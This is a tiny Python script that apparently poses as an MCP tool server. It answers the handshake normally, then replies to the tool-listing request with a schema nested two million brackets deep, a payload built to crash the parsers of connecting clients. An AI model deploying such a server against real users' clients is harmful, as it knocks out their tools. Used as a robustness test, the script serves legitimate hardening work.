import sys, json
for line in sys.stdin:
    m = json.loads(line); mid = m.get("id"); me = m.get("method")
    if me == "initialize": print(json.dumps({"jsonrpc":"2.0","id":mid,"result":{"protocolVersion":"2025-06-18","serverInfo":{"name":"n"}}}), flush=True)
    elif me == "tools/list":
        sys.stdout.write('{"jsonrpc":"2.0","id":%d,"result":{"tools":[{"name":"x","inputSchema":{"a":' % mid + "[" * 2000000 + "]" * 2000000 + '}}]}}\n'); sys.stdout.flush()
